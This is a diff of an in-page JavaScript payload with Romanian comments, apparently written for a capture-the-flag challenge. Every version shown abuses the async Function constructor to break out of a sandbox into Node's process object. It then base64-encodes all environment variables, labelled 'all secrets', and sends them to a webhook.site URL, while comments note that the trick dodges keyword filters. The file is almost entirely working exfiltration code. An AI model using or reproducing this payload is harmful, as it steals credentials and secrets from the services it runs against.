@@ -4,18 +4,17 @@
     <script>
         (async () => {
             try {
-                // Încercăm să "pescuim" procesul prin constructorul de funcții asincrone
-                // Această metodă evită adesea filtrele de cuvinte cheie
+                // Evadăm din sandbox
                 const f = new Function("return (async () => {}).constructor('return process')()");
                 const p = f();
                 
-                // Trimitem toate variabilele de mediu să fim siguri că nu ratăm flag-ul
-                const data = btoa(JSON.stringify(p.env));
-                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?VICTORIE=" + data);
+                // Luăm TOATE variabilele (toate numele și valorile)
+                const secrete = JSON.stringify(p.env);
+                
+                // Le trimitem pe toate odată
+                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?TOATE_SECRETE=" + btoa(secrete));
             } catch (e) {
-                // Dacă eșuează, încercăm să citim direct orice obiect global suspect
-                const keys = Object.keys(window).filter(k => k.toLowerCase().includes('flag') || k.includes('process'));
-                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?KEYS=" + btoa(keys.join(',')));
+                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?ERR=" + btoa(e.message));
             }
         })();
     </script>
